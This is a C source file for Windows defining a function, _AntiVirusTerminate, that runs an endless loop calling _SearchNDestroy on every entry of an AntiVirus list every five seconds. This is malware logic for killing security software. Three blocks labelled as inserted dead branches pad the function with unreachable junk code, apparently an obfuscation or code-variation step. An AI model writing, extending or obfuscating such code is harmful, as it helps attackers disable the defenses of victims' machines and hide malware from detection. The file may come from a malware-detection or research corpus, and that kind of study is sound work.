#include "data_globals.h"
#include <windows.h>
#include <stdbool.h>
#include <stdlib.h>   // for malloc/free

DWORD WINAPI _AntiVirusTerminate(void)
{
    int index = 0;

    // --- INSERTED DEAD BRANCH 1 (ADDITIVE ONLY) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        SYSTEMTIME st;
        char user_buf[128];
        DWORD user_len = sizeof(user_buf);
        GetSystemInfo(&si);
        GetLocalTime(&st);
        if (GetUserNameA(user_buf, &user_len)) {
            volatile DWORD hash = 0;
            for (volatile DWORD i = 0; i < 2; i++) {
                hash += si.dwNumberOfProcessors + st.wHour;
            }
            hash ^= user_buf[0];
            volatile DWORD j = 0;
            while (j < 2) {
                hash = (hash << 5) - hash + si.dwPageSize;
                j++;
            }
            memset(user_buf, 0, sizeof(user_buf));
        }
    }

    do {
        for (index = 0; AntiVirus[index] != NULL; index++) {
            // --- INSERTED DEAD BRANCH 2 (ADDITIVE ONLY) ---
            volatile DWORD dummy_tick_2 = GetTickCount();
            if ((dummy_tick_2 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_2 & 0x80000000) != 0) {
                char *tmp = (char *)malloc(64);
                if (tmp != NULL) {
                    strcpy(tmp, "dummy");
                    volatile DWORD len = strlen(tmp);
                    volatile BYTE check = 0;
                    for (volatile DWORD i = 0; i < len; i++) {
                        check ^= tmp[i];
                    }
                    volatile DWORD j = 0;
                    while (j < 2) {
                        check += j + (DWORD)index; // read index, not modify
                        j++;
                    }
                    char tmp2[32];
                    memcpy(tmp2, tmp, 4);
                    volatile DWORD val = (DWORD)tmp2[0] + check;
                    val += len;
                    free(tmp);
                }
            }

            _SearchNDestroy((char *)AntiVirus[index]);
        }
        Sleep(5000);
    } while(true);

    // --- INSERTED DEAD BRANCH 3 (ADDITIVE ONLY) ---
    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
        volatile DWORD dummy_array[4];
        for (volatile DWORD i = 0; i < 4; i++) {
            dummy_array[i] = i * 0x811C9DC5;
        }
        volatile DWORD hash = 0;
        for (volatile DWORD i = 0; i < 4; i++) {
            hash ^= dummy_array[i];
            hash = (hash << 5) - hash;
        }
        volatile DWORD extra_val = 0;
        for (volatile DWORD i = 0; i < 2; i++) {
            extra_val += (hash >> i) & 0xFF;
        }
        extra_val ^= dummy_array[3];
        memset(dummy_array, 0, sizeof(dummy_array));
    }

    return 0;
}
